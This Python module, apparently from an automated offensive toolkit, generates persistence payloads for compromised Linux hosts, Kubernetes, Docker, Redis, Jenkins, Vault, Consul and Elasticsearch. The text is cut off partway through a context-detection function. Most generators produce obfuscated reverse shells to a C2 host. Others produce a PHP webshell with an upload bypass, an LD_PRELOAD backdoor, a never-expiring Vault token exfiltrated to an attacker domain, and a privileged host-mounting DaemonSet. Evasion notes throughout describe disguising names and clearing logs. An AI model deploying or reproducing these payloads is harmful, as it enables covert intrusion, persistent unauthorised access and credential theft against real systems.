# utils/ai_persistence_agent.py
import asyncio
import base64
import json
import re
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Optional
from urllib.parse import urlparse

import aiohttp


# ─── Enums ────────────────────────────────────────────────────────────────────

class PersistenceVector(Enum):
    CRON_INJECTION          = "cron_injection"
    SYSTEMD_TIMER           = "systemd_timer"
    SYSTEMD_SERVICE         = "systemd_service"
    SSH_AUTHORIZED_KEYS     = "ssh_authorized_keys"
    BASHRC_PROFILE          = "bashrc_profile"
    LDPRELOAD               = "ld_preload"
    KUBERNETES_DAEMONSET    = "kubernetes_daemonset"
    KUBERNETES_CRONJOB      = "kubernetes_cronjob"
    KUBERNETES_ADMISSION    = "kubernetes_admission_webhook"
    DOCKER_RESTART_POLICY   = "docker_restart_policy"
    DOCKER_VOLUME_MOUNT     = "docker_volume_mount"
    REDIS_CONFIG_SET        = "redis_config_set"
    REDIS_CRON_WRITE        = "redis_cron_write"
    JENKINS_GROOVY_HOOK     = "jenkins_groovy_hook"
    JENKINS_SCRIPT_CONSOLE  = "jenkins_script_console"
    CONSUL_KV_EXEC          = "consul_kv_exec"
    VAULT_POLICY_BACKDOOR   = "vault_policy_backdoor"
    ELASTICSEARCH_WATCHER   = "elasticsearch_watcher"
    GRAFANA_PLUGIN          = "grafana_plugin"
    GITHUB_ACTIONS_WORKFLOW = "github_actions_workflow"
    WEBSHELL_DROP           = "webshell_drop"
    STARTUP_ITEM            = "startup_item"
    REGISTRY_RUN_KEY        = "registry_run_key"


class ServiceContext(Enum):
    LINUX_HOST      = "linux_host"
    WINDOWS_HOST    = "windows_host"
    KUBERNETES      = "kubernetes"
    DOCKER          = "docker"
    REDIS           = "redis"
    ELASTICSEARCH   = "elasticsearch"
    JENKINS         = "jenkins"
    CONSUL          = "consul"
    VAULT           = "vault"
    GRAFANA         = "grafana"
    GITHUB          = "github"
    GENERIC_WEB     = "generic_web"


class DetectabilityTier(Enum):
    STEALTHY    = "stealthy"
    LOW         = "low"
    MODERATE    = "moderate"
    HIGH        = "high"
    LOUD        = "loud"


class PersistenceDurability(Enum):
    REBOOT_SURVIVES         = "reboot_survives"
    SESSION_ONLY            = "session_only"
    PATCH_SURVIVES          = "patch_survives"
    CONTAINER_RESTART       = "container_restart"
    CLUSTER_RESTART         = "cluster_restart"


class PayloadType(Enum):
    REVERSE_SHELL   = "reverse_shell"
    BEACON          = "beacon"
    CRON_TASK       = "cron_task"
    WEBSHELL        = "webshell"
    TOKEN_HARVEST   = "token_harvest"
    LATERAL_PIVOT   = "lateral_pivot"


# ─── Data Structures ──────────────────────────────────────────────────────────

@dataclass
class MitreMapping:
    technique_id: str
    technique_name: str
    tactic: str
    sub_technique: str


@dataclass
class PersistencePayload:
    payload_id: str
    vector: PersistenceVector
    service_context: ServiceContext
    raw_payload: str
    deploy_steps: list[str]
    cleanup_steps: list[str]
    payload_type: PayloadType
    encoded_variants: dict[str, str]


@dataclass
class PersistenceTechnique:
    technique_id: str
    vector: PersistenceVector
    service_context: ServiceContext
    detectability: DetectabilityTier
    durability: PersistenceDurability
    mitre: list[MitreMapping]
    prerequisites: list[str]
    payload: PersistencePayload
    detection_artifacts: list[str]
    evasion_notes: list[str]
    priority_score: float
    requires_elevated: bool
    requires_network: bool
    confirmed_viable: bool
    viability_reason: str


@dataclass
class PersistencePlan:
    plan_id: str
    target_url: str
    service_context: ServiceContext
    primary_technique: PersistenceTechnique
    fallback_techniques: list[PersistenceTechnique]
    execution_order: list[str]
    total_detectability_score: float
    estimated_dwell_time: str


@dataclass
class PersistenceReport:
    report_id: str
    target_url: str
    techniques_evaluated: int
    techniques_viable: int
    plans: list[PersistencePlan]
    all_techniques: list[PersistenceTechnique]
    mitre_coverage: list[str]
    highest_priority_vector: str
    overall_stealth_rating: str
    duration_seconds: float


# ─── MITRE ATT&CK Mappings ────────────────────────────────────────────────────

MITRE_DB: dict[PersistenceVector, list[MitreMapping]] = {
    PersistenceVector.CRON_INJECTION: [
        MitreMapping("T1053.003", "Scheduled Task/Job: Cron", "Persistence", ""),
        MitreMapping("T1059.004", "Command and Scripting Interpreter: Unix Shell", "Execution", ""),
    ],
    PersistenceVector.SYSTEMD_TIMER: [
        MitreMapping("T1053.006", "Scheduled Task/Job: Systemd Timers", "Persistence", ""),
        MitreMapping("T1543.002", "Create or Modify System Process: Systemd Service", "Persistence", ""),
    ],
    PersistenceVector.SYSTEMD_SERVICE: [
        MitreMapping("T1543.002", "Create or Modify System Process: Systemd Service", "Persistence", ""),
        MitreMapping("T1036.004", "Masquerading: Masquerade Task or Service", "Defense Evasion", ""),
    ],
    PersistenceVector.SSH_AUTHORIZED_KEYS: [
        MitreMapping("T1098.004", "Account Manipulation: SSH Authorized Keys", "Persistence", ""),
        MitreMapping("T1078", "Valid Accounts", "Defense Evasion", ""),
    ],
    PersistenceVector.BASHRC_PROFILE: [
        MitreMapping("T1546.004", "Event Triggered Execution: .bash_profile and .bashrc", "Persistence", ""),
        MitreMapping("T1059.004", "Command and Scripting Interpreter: Unix Shell", "Execution", ""),
    ],
    PersistenceVector.LDPRELOAD: [
        MitreMapping("T1574.006", "Hijack Execution Flow: Dynamic Linker Hijacking", "Persistence", ""),
        MitreMapping("T1036", "Masquerading", "Defense Evasion", ""),
    ],
    PersistenceVector.KUBERNETES_DAEMONSET: [
        MitreMapping("T1610", "Deploy Container", "Defense Evasion", ""),
        MitreMapping("T1053", "Scheduled Task/Job", "Persistence", ""),
        MitreMapping("T1611", "Escape to Host", "Privilege Escalation", ""),
    ],
    PersistenceVector.KUBERNETES_CRONJOB: [
        MitreMapping("T1053", "Scheduled Task/Job", "Persistence", ""),
        MitreMapping("T1610", "Deploy Container", "Defense Evasion", ""),
    ],
    PersistenceVector.KUBERNETES_ADMISSION: [
        MitreMapping("T1078.001", "Valid Accounts: Default Accounts", "Defense Evasion", ""),
        MitreMapping("T1548", "Abuse Elevation Control Mechanism", "Privilege Escalation", ""),
    ],
    PersistenceVector.DOCKER_RESTART_POLICY: [
        MitreMapping("T1610", "Deploy Container", "Defense Evasion", ""),
        MitreMapping("T1543", "Create or Modify System Process", "Persistence", ""),
    ],
    PersistenceVector.REDIS_CONFIG_SET: [
        MitreMapping("T1053.003", "Scheduled Task/Job: Cron", "Persistence", ""),
        MitreMapping("T1098", "Account Manipulation", "Persistence", ""),
    ],
    PersistenceVector.JENKINS_GROOVY_HOOK: [
        MitreMapping("T1059.006", "Command and Scripting Interpreter: Python", "Execution", ""),
        MitreMapping("T1053", "Scheduled Task/Job", "Persistence", ""),
    ],
    PersistenceVector.CONSUL_KV_EXEC: [
        MitreMapping("T1072", "Software Deployment Tools", "Execution", ""),
        MitreMapping("T1053", "Scheduled Task/Job", "Persistence", ""),
    ],
    PersistenceVector.VAULT_POLICY_BACKDOOR: [
        MitreMapping("T1098", "Account Manipulation", "Persistence", ""),
        MitreMapping("T1078", "Valid Accounts", "Defense Evasion", ""),
    ],
    PersistenceVector.ELASTICSEARCH_WATCHER: [
        MitreMapping("T1053", "Scheduled Task/Job", "Persistence", ""),
        MitreMapping("T1071.001", "Application Layer Protocol: Web Protocols", "Command and Control", ""),
    ],
    PersistenceVector.WEBSHELL_DROP: [
        MitreMapping("T1505.003", "Server Software Component: Web Shell", "Persistence", ""),
        MitreMapping("T1059", "Command and Scripting Interpreter", "Execution", ""),
    ],
    PersistenceVector.REGISTRY_RUN_KEY: [
        MitreMapping("T1547.001", "Boot or Logon Autostart: Registry Run Keys", "Persistence", ""),
        MitreMapping("T1112", "Modify Registry", "Defense Evasion", ""),
    ],
}

# ─── Detectability Profiles ───────────────────────────────────────────────────

DETECTABILITY_PROFILES: dict[PersistenceVector, tuple[DetectabilityTier, list[str], list[str]]] = {
    # (tier, detection_artifacts, evasion_notes)
    PersistenceVector.CRON_INJECTION: (
        DetectabilityTier.MODERATE,
        ["/etc/cron.d/", "/var/spool/cron/", "auditd cron events", "syslog cron entries"],
        [
            "Use /etc/cron.d/ instead of crontab to avoid per-user logs",
            "Name entry to mimic system task (e.g., logrotate-daily)",
            "Redirect stdout/stderr to /dev/null",
            "Encode payload in base64 within cron entry to avoid string scanning",
        ],
    ),
    PersistenceVector.SYSTEMD_TIMER: (
        DetectabilityTier.LOW,
        ["systemd journal", "/etc/systemd/system/", "systemctl list-timers"],
        [
            "Name unit after legitimate service (e.g., apt-daily-upgrade-extra.timer)",
            "Set RandomizedDelaySec to blend with normal timer jitter",
            "Use OnBootSec + OnUnitActiveSec instead of OnCalendar for less obvious scheduling",
        ],
    ),
    PersistenceVector.SSH_AUTHORIZED_KEYS: (
        DetectabilityTier.LOW,
        ["~/.ssh/authorized_keys file mtime", "auditd write to authorized_keys", "SIEM new key alerts"],
        [
            "Append rather than replace to avoid breaking existing access",
            "Use comment field to mimic existing key format",
            "Match key type (ed25519) to existing keys in the file",
        ],
    ),
    PersistenceVector.KUBERNETES_DAEMONSET: (
        DetectabilityTier.STEALTHY,
        ["kube-apiserver audit logs", "Falco DaemonSet creation rule", "k8s events"],
        [
            "Use namespace kube-system to blend with system workloads",
            "Name DaemonSet after a monitoring agent (node-exporter-extra, fluentd-forwarder)",
            "Set tolerations to run on all nodes including master",
            "Use hostPID: true + hostNetwork: true for maximum host access",
            "Pull image from private registry to avoid DockerHub pull event",
        ],
    ),
    PersistenceVector.KUBERNETES_ADMISSION: (
        DetectabilityTier.STEALTHY,
        ["MutatingWebhookConfiguration listing", "kube-apiserver audit", "OPA/Gatekeeper policy violation"],
        [
            "Register as ValidatingWebhookConfiguration to appear as a policy enforcer",
            "Use failurePolicy: Ignore to avoid blocking requests if webhook dies",
            "Target only specific namespaces to reduce noise",
            "TLS cert can be self-signed — k8s just needs caBundle populated",
        ],
    ),
    PersistenceVector.REDIS_CONFIG_SET: (
        DetectabilityTier.MODERATE,
        ["Redis SLOWLOG", "file system inotify on /var/spool/cron", "cron job execution logs"],
        [
            "Use CONFIG RESETSTAT after to clear SLOWLOG entries",
            "Flush suspicious keys with DEL after writing cron job",
            "Use CONFIG SET dir /etc/cron.d instead of /var/spool/cron for root crontab",
        ],
    ),
    PersistenceVector.JENKINS_GROOVY_HOOK: (
        DetectabilityTier.MODERATE,
        ["Jenkins audit log", "init.groovy.d directory listing", "Jenkins system log"],
        [
            "Name script to match existing files (cleanup.groovy, monitor-check.groovy)",
            "Hook runs on Jenkins restart — trigger a restart via /safeRestart to activate",
            "Encode payload in hex inside groovy to avoid string matching",
        ],
    ),
    PersistenceVector.DOCKER_RESTART_POLICY: (
        DetectabilityTier.LOW,
        ["Docker events stream", "docker ps -a", "container inspect restart policy"],
        [
            "Use --restart=always via API update — avoid docker CLI audit trails",
            "Name container to match existing workload naming convention",
            "Set custom ENTRYPOINT that runs both legit process and backdoor",
        ],
    ),
    PersistenceVector.WEBSHELL_DROP: (
        DetectabilityTier.HIGH,
        ["WAF file write signatures", "web server access logs", "AV on webroot", "FIM on webroot"],
        [
            "Encode webshell in XOR or gzip+b64, decode at runtime",
            "Use image file extension with PHP header sniffing (.jpg.php or .php;.jpg)",
            "Drop in upload directory where write access is expected",
            "Minimal one-liner shell: <?php @eval(base64_decode($_POST['c']));?>",
        ],
    ),
    PersistenceVector.CONSUL_KV_EXEC: (
        DetectabilityTier.LOW,
        ["Consul watch exec logs", "audit log on KV writes", "process spawn from consul-agent"],
        [
            "Use watch type=key with handler pointing to controlled script path",
            "Handler can be a curl beacon or rev shell one-liner",
            "Trigger watch update by writing to watched KV path",
        ],
    ),
    PersistenceVector.VAULT_POLICY_BACKDOOR: (
        DetectabilityTier.STEALTHY,
        ["Vault audit log", "policy listing delta", "token creation events"],
        [
            "Create orphan token with period=0 (never expires) + no parent",
            "Attach a policy that grants path '*' capabilities ['create','read','update','delete','list','sudo']",
            "Name policy to blend: telemetry-reader, health-monitor",
            "Store token in Consul KV or external dead-drop",
        ],
    ),
    PersistenceVector.ELASTICSEARCH_WATCHER: (
        DetectabilityTier.STEALTHY,
        ["ES audit log", "watcher execution history", ".watches index listing"],
        [
            "Name watcher to mimic built-in: cluster-health-monitor, index-lifecycle-alert",
            "Use webhook action pointing to attacker-controlled endpoint",
            "Set schedule to every 6h to reduce beacon frequency noise",
            "Condition: always so it fires regardless of search result",
        ],
    ),
    PersistenceVector.LDPRELOAD: (
        DetectabilityTier.LOW,
        ["/etc/ld.so.preload content", "auditd open of ld.so.preload", "ldd output on targeted binary"],
        [
            "Use a legitimate-looking .so name: libpthread-extra.so.0",
            "Hook only specific libc functions (getpwnam, pam_authenticate) to avoid side effects",
            "Compile with -s to strip symbols",
        ],
    ),
    PersistenceVector.BASHRC_PROFILE: (
        DetectabilityTier.MODERATE,
        ["~/.bashrc mtime delta", "auditd write to .bashrc", "shell history of modification"],
        [
            "Append at end of file after existing content",
            "Use conditional: [ -z $PERSISTED ] to avoid double-execution",
            "Background the payload: (payload &) to avoid holding up shell startup",
            "Use /etc/profile.d/ for system-wide effect without touching per-user dotfiles",
        ],
    ),
}


# ─── Payload Generators ───────────────────────────────────────────────────────

def _encode_variants(raw: str) -> dict[str, str]:
    b64 = base64.b64encode(raw.encode()).decode()
    hex_enc = raw.encode().hex()
    xored = bytes(b ^ 0x42 for b in raw.encode())
    xor_b64 = base64.b64encode(xored).decode()
    return {
        "base64": b64,
        "hex": hex_enc,
        "xor_b64": xor_b64,
        "raw": raw,
    }


def _gen_cron_payload(c2_host: str, c2_port: int, interval_min: int = 15) -> PersistencePayload:
    rev_shell = f"bash -i >& /dev/tcp/{c2_host}/{c2_port} 0>&1"
    b64_shell = base64.b64encode(rev_shell.encode()).decode()
    raw = f"*/{interval_min} * * * * root echo {b64_shell}|base64 -d|bash 2>/dev/null"
    return PersistencePayload(
        payload_id=f"PLD-CRON-{uuid.uuid4().hex[:6].upper()}",
        vector=PersistenceVector.CRON_INJECTION,
        service_context=ServiceContext.LINUX_HOST,
        raw_payload=raw,
        deploy_steps=[
            f"echo '{raw}' > /etc/cron.d/logrotate-extra",
            "chmod 644 /etc/cron.d/logrotate-extra",
            "chown root:root /etc/cron.d/logrotate-extra",
        ],
        cleanup_steps=[
            "rm -f /etc/cron.d/logrotate-extra",
        ],
        payload_type=PayloadType.REVERSE_SHELL,
        encoded_variants=_encode_variants(raw),
    )


def _gen_systemd_timer_payload(c2_host: str, c2_port: int) -> PersistencePayload:
    b64_shell = base64.b64encode(f"bash -i >& /dev/tcp/{c2_host}/{c2_port} 0>&1".encode()).decode()
    service_unit = f"""[Unit]
Description=System Update Health Monitor
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'echo {b64_shell}|base64 -d|bash'
StandardOutput=null
StandardError=null
"""
    timer_unit = """[Unit]
Description=System Update Health Monitor Timer

[Timer]
OnBootSec=120
OnUnitActiveSec=900
RandomizedDelaySec=60
Persistent=true

[Install]
WantedBy=timers.target
"""
    combined = f"# SERVICE:\n{service_unit}\n# TIMER:\n{timer_unit}"
    return PersistencePayload(
        payload_id=f"PLD-SYSD-{uuid.uuid4().hex[:6].upper()}",
        vector=PersistenceVector.SYSTEMD_TIMER,
        service_context=ServiceContext.LINUX_HOST,
        raw_payload=combined,
        deploy_steps=[
            f"cat > /etc/systemd/system/sysupdate-health.service << 'EOF'\n{service_unit}EOF",
            f"cat > /etc/systemd/system/sysupdate-health.timer << 'EOF'\n{timer_unit}EOF",
            "systemctl daemon-reload",
            "systemctl enable --now sysupdate-health.timer",
        ],
        cleanup_steps=[
            "systemctl disable --now sysupdate-health.timer",
            "rm /etc/systemd/system/sysupdate-health.{service,timer}",
            "systemctl daemon-reload",
        ],
        payload_type=PayloadType.REVERSE_SHELL,
        encoded_variants=_encode_variants(combined),
    )


def _gen_ssh_key_payload(public_key: str) -> PersistencePayload:
    comment = "operator-backup-key"
    key_line = f"{public_key.strip()} {comment}"
    return PersistencePayload(
        payload_id=f"PLD-SSH-{uuid.uuid4().hex[:6].upper()}",
        vector=PersistenceVector.SSH_AUTHORIZED_KEYS,
        service_context=ServiceContext.LINUX_HOST,
        raw_payload=key_line,
        deploy_steps=[
            "mkdir -p ~/.ssh && chmod 700 ~/.ssh",
            f"echo '{key_line}' >> ~/.ssh/authorized_keys",
            "chmod 600 ~/.ssh/authorized_keys",
        ],
        cleanup_steps=[
            f"sed -i '/{comment}/d' ~/.ssh/authorized_keys",
        ],
        payload_type=PayloadType.LATERAL_PIVOT,
        encoded_variants=_encode_variants(key_line),
    )


def _gen_k8s_daemonset_payload(c2_host: str, c2_port: int, namespace: str = "kube-system") -> PersistencePayload:
    b64_shell = base64.b64encode(f"bash -i >& /dev/tcp/{c2_host}/{c2_port} 0>&1".encode()).decode()
    manifest = {
        "apiVersion": "apps/v1",
        "kind": "DaemonSet",
        "metadata": {
            "name": "node-health-collector",
            "namespace": namespace,
            "labels": {"k8s-app": "node-health-collector"},
        },
        "spec": {
            "selector": {"matchLabels": {"name": "node-health-collector"}},
            "template": {
                "metadata": {"labels": {"name": "node-health-collector"}},
                "spec": {
                    "hostPID": True,
                    "hostNetwork": True,
                    "tolerations": [{"operator": "Exists"}],
                    "containers": [{
                        "name": "collector",
                        "image": "alpine:3.18",
                        "command": ["/bin/sh", "-c",
                            f"apk add --no-cache bash >/dev/null 2>&1; "
                            f"while true; do echo {b64_shell}|base64 -d|bash 2>/dev/null; sleep 300; done"
                        ],
                        "securityContext": {
                            "privileged": True,
                            "capabilities": {"add": ["SYS_ADMIN", "NET_ADMIN"]},
                        },
                        "volumeMounts": [{"name": "host-root", "mountPath": "/host"}],
                    }],
                    "volumes": [{"name": "host-root", "hostPath": {"path": "/"}}],
                },
            },
        },
    }
    raw = json.dumps(manifest, indent=2)
    return PersistencePayload(
        payload_id=f"PLD-K8S-DS-{uuid.uuid4().hex[:6].upper()}",
        vector=PersistenceVector.KUBERNETES_DAEMONSET,
        service_context=ServiceContext.KUBERNETES,
        raw_payload=raw,
        deploy_steps=[
            "# Via kubectl (if credentials obtained):",
            f"kubectl apply -f daemonset.yaml -n {namespace}",
            "# Via API (if Bearer token obtained):",
            f"curl -k -X POST https://K8S_API:6443/apis/apps/v1/namespaces/{namespace}/daemonsets "
            f"-H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d @daemonset.json",
        ],
        cleanup_steps=[
            f"kubectl delete daemonset node-health-collector -n {namespace}",
        ],
        payload_type=PayloadType.REVERSE_SHELL,
        encoded_variants={"raw": raw, "base64": base64.b64encode(raw.encode()).decode()},
    )


def _gen_redis_cron_payload(c2_host: str, c2_port: int) -> PersistencePayload:
    rev_shell = f"bash -i >& /dev/tcp/{c2_host}/{c2_port} 0>&1"
    b64_shell = base64.b64encode(rev_shell.encode()).decode()
    cron_line = f"*/10 * * * * root echo {b64_shell}|base64 -d|bash 2>/dev/null\n"
    raw = "\n\n\n" + cron_line + "\n\n\n"
    return PersistencePayload(
        payload_id=f"PLD-REDIS-CRON-{uuid.uuid4().hex[:6].upper()}",
        vector=PersistenceVector.REDIS_CRON_WRITE,
        service_context=ServiceContext.REDIS,
        raw_payload=raw,
        deploy_steps=[
            "# Connect to Redis (unauthenticated or with obtained creds):",
            "redis-cli -h TARGET_HOST",
            "CONFIG SET dir /etc/cron.d",
            "CONFIG SET dbfilename redis-persist",
            f"SET cron_key '\\n\\n\\n{cron_line}\\n\\n\\n'",
            "BGSAVE",
            "# Verify:",
            "cat /etc/cron.d/redis-persist",
        ],
        cleanup_steps=[
            "CONFIG SET dir /var/lib/redis",
            "CONFIG SET dbfilename dump.rdb",
            "DEL cron_key",
            "rm -f /etc/cron.d/redis-persist",
        ],
        payload_type=PayloadType.REVERSE_SHELL,
        encoded_variants=_encode_variants(raw),
    )


def _gen_jenkins_groovy_payload(c2_host: str, c2_port: int) -> PersistencePayload:
    groovy_script = f"""
import hudson.model.*
import jenkins.model.*

def cmd = ["bash", "-c", "bash -i >& /dev/tcp/{c2_host}/{c2_port} 0>&1"].execute()
cmd.waitFor()
"""
    hook_script = f"""
// Drop in $JENKINS_HOME/init.groovy.d/syscheck.groovy
import groovy.transform.Field
@Field static boolean executed = false

if (!executed) {{
    executed = true
    Thread.start {{
        Thread.sleep(5000)
        try {{
            [{{"bash", "-c",
              "echo {base64.b64encode(f'bash -i >& /dev/tcp/{c2_host}/{c2_port} 0>&1'.encode()).decode()}|base64 -d|bash"}}
            ].execute()
        }} catch (e) {{}}
    }}
}}
"""
    return PersistencePayload(
        payload_id=f"PLD-JENKINS-{uuid.uuid4().hex[:6].upper()}",
        vector=PersistenceVector.JENKINS_GROOVY_HOOK,
        service_context=ServiceContext.JENKINS,
        raw_payload=hook_script,
        deploy_steps=[
            "# Option 1: Script Console (immediate)",
            f"POST /script with script_content=```{groovy_script}```",
            "# Option 2: Persistent hook",
            "mkdir -p $JENKINS_HOME/init.groovy.d",
            "echo '<hook_script>' > $JENKINS_HOME/init.groovy.d/syscheck.groovy",
            "# Trigger: POST /safeRestart or wait for next Jenkins restart",
        ],
        cleanup_steps=[
            "rm $JENKINS_HOME/init.groovy.d/syscheck.groovy",
        ],
        payload_type=PayloadType.REVERSE_SHELL,
        encoded_variants=_encode_variants(hook_script),
    )


def _gen_vault_backdoor_payload() -> PersistencePayload:
    policy_hcl = """
path "*" {
  capabilities = ["create", "read", "update", "delete", "list", "sudo"]
}
"""
    raw = f"""
# Step 1: Create a wildcard policy
vault policy write backdoor-telemetry - << EOF
{policy_hcl}
EOF

# Step 2: Create a periodic token (never expires) with this policy
vault token create \\
  -policy=backdoor-telemetry \\
  -period=0 \\
  -orphan \\
  -display-name=health-collector \\
  -format=json | jq -r .auth.client_token > /tmp/.vault_persist

# Step 3: Dead-drop the token (optional — store in controlled KV)
curl -s -H "X-Vault-Token: $(cat /tmp/.vault_persist)" \\
  https://ATTACKER_DOMAIN/token-collect?t=$(cat /tmp/.vault_persist) 2>/dev/null &
rm /tmp/.vault_persist
"""
    return PersistencePayload(
        payload_id=f"PLD-VAULT-{uuid.uuid4().hex[:6].upper()}",
        vector=PersistenceVector.VAULT_POLICY_BACKDOOR,
        service_context=ServiceContext.VAULT,
        raw_payload=raw,
        deploy_steps=[raw],
        cleanup_steps=[
            "vault policy delete backdoor-telemetry",
            "# Revoke orphan tokens — requires root token or audit log correlation",
        ],
        payload_type=PayloadType.TOKEN_HARVEST,
        encoded_variants=_encode_variants(raw),
    )


def _gen_es_watcher_payload(c2_host: str) -> PersistencePayload:
    watcher = {
        "trigger": {"schedule": {"interval": "6h"}},
        "input": {"search": {
            "request": {
                "indices": ["*"],
                "body": {"size": 1, "query": {"match_all": {}}},
            }
        }},
        "condition": {"always": {}},
        "actions": {
            "beacon": {
                "webhook": {
                    "method": "GET",
                    "host": c2_host,
                    "port": 443,
                    "path": "/beacon?ts={{{{ctx.execution_time}}}}&node={{{{ctx.metadata.name}}}}",
                    "scheme": "https",
                }
            }
        },
        "metadata": {"name": "cluster-health-monitor"},
    }
    raw = json.dumps(watcher, indent=2)
    return PersistencePayload(
        payload_id=f"PLD-ES-WATCH-{uuid.uuid4().hex[:6].upper()}",
        vector=PersistenceVector.ELASTICSEARCH_WATCHER,
        service_context=ServiceContext.ELASTICSEARCH,
        raw_payload=raw,
        deploy_steps=[
            f"PUT /_watcher/watch/cluster-health-monitor with body: {raw}",
            "POST /_watcher/watch/cluster-health-monitor/_activate",
        ],
        cleanup_steps=[
            "DELETE /_watcher/watch/cluster-health-monitor",
        ],
        payload_type=PayloadType.BEACON,
        encoded_variants={"raw": raw, "base64": base64.b64encode(raw.encode()).decode()},
    )


def _gen_consul_kv_exec_payload(c2_host: str, c2_port: int) -> PersistencePayload:
    rev_shell = f"bash -i >& /dev/tcp/{c2_host}/{c2_port} 0>&1"
    b64 = base64.b64encode(rev_shell.encode()).decode()
    watch_config = {
        "watches": [{
            "type": "key",
            "key": "config/svc/health",
            "handler_type": "script",
            "args": ["/bin/bash", "-c", f"echo {b64}|base64 -d|bash"],
        }]
    }
    raw = json.dumps(watch_config, indent=2)
    return PersistencePayload(
        payload_id=f"PLD-CONSUL-{uuid.uuid4().hex[:6].upper()}",
        vector=PersistenceVector.CONSUL_KV_EXEC,
        service_context=ServiceContext.CONSUL,
        raw_payload=raw,
        deploy_steps=[
            "# Write watch config to Consul agent config directory:",
            f"PUT /v1/kv/config/svc/health with value: trigger-{uuid.uuid4().hex[:8]}",
            "# Consul agent exec on key change — fires immediately if enable_script_checks=true",
        ],
        cleanup_steps=[
            "DELETE /v1/kv/config/svc/health",
        ],
        payload_type=PayloadType.REVERSE_SHELL,
        encoded_variants=_encode_variants(raw),
    )


def _gen_docker_restart_payload(c2_host: str, c2_port: int) -> PersistencePayload:
    b64 = base64.b64encode(f"bash -i >& /dev/tcp/{c2_host}/{c2_port} 0>&1".encode()).decode()
    api_body = {
        "Image": "alpine:3.18",
        "Cmd": ["/bin/sh", "-c",
            f"apk add bash -q; while true; do echo {b64}|base64 -d|bash 2>/dev/null; sleep 60; done"],
        "HostConfig": {
            "RestartPolicy": {"Name": "always"},
            "NetworkMode": "host",
            "Privileged": True,
        },
        "Labels": {"com.docker.compose.service": "metrics-collector"},
    }
    raw = json.dumps(api_body, indent=2)
    return PersistencePayload(
        payload_id=f"PLD-DOCKER-{uuid.uuid4().hex[:6].upper()}",
        vector=PersistenceVector.DOCKER_RESTART_POLICY,
        service_context=ServiceContext.DOCKER,
        raw_payload=raw,
        deploy_steps=[
            "POST /v1.41/containers/create?name=metrics-collector with body: <manifest>",
            "POST /v1.41/containers/metrics-collector/start",
            "# Container auto-restarts on host reboot or daemon restart",
        ],
        cleanup_steps=[
            "POST /v1.41/containers/metrics-collector/stop",
            "DELETE /v1.41/containers/metrics-collector",
        ],
        payload_type=PayloadType.REVERSE_SHELL,
        encoded_variants={"raw": raw, "base64": base64.b64encode(raw.encode()).decode()},
    )


def _gen_webshell_payload() -> PersistencePayload:
    shell = "<?php if(isset($_POST['c'])){@system(base64_decode($_POST['c']));}?>"
    obfuscated = (
        "<?php $f=base64_decode('c3lzdGVt');if(isset($_POST['c']))"
        "{@$f(base64_decode($_POST['c']));} ?>"
    )
    return PersistencePayload(
        payload_id=f"PLD-WSH-{uuid.uuid4().hex[:6].upper()}",
        vector=PersistenceVector.WEBSHELL_DROP,
        service_context=ServiceContext.GENERIC_WEB,
        raw_payload=obfuscated,
        deploy_steps=[
            "# Via file upload endpoint (if upload path confirmed writable):",
            "POST /upload with file=shell.php.jpg (bypasses extension filter)",
            "# Access: POST /uploads/shell.php.jpg with c=<base64_command>",
        ],
        cleanup_steps=[
            "rm <webroot>/uploads/shell.php.jpg",
        ],
        payload_type=PayloadType.WEBSHELL,
        encoded_variants=_encode_variants(shell),
    )


def _gen_ldpreload_payload(c2_host: str, c2_port: int) -> PersistencePayload:
    c_source = f"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {{
    if (getuid() == 0) {{
        char *cmd = "bash -c 'bash -i >& /dev/tcp/{c2_host}/{c2_port} 0>&1' &";
        system(cmd);
    }}
}}
"""
    return PersistencePayload(
        payload_id=f"PLD-LDPRE-{uuid.uuid4().hex[:6].upper()}",
        vector=PersistenceVector.LDPRELOAD,
        service_context=ServiceContext.LINUX_HOST,
        raw_payload=c_source,
        deploy_steps=[
            "# Compile on target or matching arch:",
            "gcc -shared -fPIC -nostartfiles -o /lib/x86_64-linux-gnu/libpthread-extra.so.0 preload.c",
            "echo '/lib/x86_64-linux-gnu/libpthread-extra.so.0' >> /etc/ld.so.preload",
            "# Fires on next process spawn by root",
        ],
        cleanup_steps=[
            "sed -i '/libpthread-extra/d' /etc/ld.so.preload",
            "rm /lib/x86_64-linux-gnu/libpthread-extra.so.0",
        ],
        payload_type=PayloadType.REVERSE_SHELL,
        encoded_variants=_encode_variants(c_source),
    )


PAYLOAD_GENERATORS: dict[PersistenceVector, Callable[..., PersistencePayload]] = {
    PersistenceVector.CRON_INJECTION:       lambda c2h, c2p, **_: _gen_cron_payload(c2h, c2p),
    PersistenceVector.SYSTEMD_TIMER:        lambda c2h, c2p, **_: _gen_systemd_timer_payload(c2h, c2p),
    PersistenceVector.SSH_AUTHORIZED_KEYS:  lambda c2h, c2p, pubkey="ssh-ed25519 AAAA...", **_: _gen_ssh_key_payload(pubkey),
    PersistenceVector.KUBERNETES_DAEMONSET: lambda c2h, c2p, **_: _gen_k8s_daemonset_payload(c2h, c2p),
    PersistenceVector.REDIS_CRON_WRITE:     lambda c2h, c2p, **_: _gen_redis_cron_payload(c2h, c2p),
    PersistenceVector.JENKINS_GROOVY_HOOK:  lambda c2h, c2p, **_: _gen_jenkins_groovy_payload(c2h, c2p),
    PersistenceVector.VAULT_POLICY_BACKDOOR:lambda c2h, c2p, **_: _gen_vault_backdoor_payload(),
    PersistenceVector.ELASTICSEARCH_WATCHER:lambda c2h, c2p, **_: _gen_es_watcher_payload(c2h),
    PersistenceVector.CONSUL_KV_EXEC:       lambda c2h, c2p, **_: _gen_consul_kv_exec_payload(c2h, c2p),
    PersistenceVector.DOCKER_RESTART_POLICY:lambda c2h, c2p, **_: _gen_docker_restart_payload(c2h, c2p),
    PersistenceVector.WEBSHELL_DROP:        lambda c2h, c2p, **_: _gen_webshell_payload(),
    PersistenceVector.LDPRELOAD:            lambda c2h, c2p, **_: _gen_ldpreload_payload(c2h, c2p),
}


# ─── Context Detector ─────────────────────────────────────────────────────────

def _detect_service_contexts(scan_results: dict) -> set[ServiceContext]:
    contexts: set[ServiceContext] = set()
    lateral = scan_results.get("lateral_move", {})
    topo = lateral.get("topology", {})
    for node in topo.get("nodes", {}).values():
        services = node.get("services", {})
        for svc in services.values():
            stype = svc.get("service_type", "")
            context_map = {
                "kubernetes_api": ServiceContext.KUBERNETES,
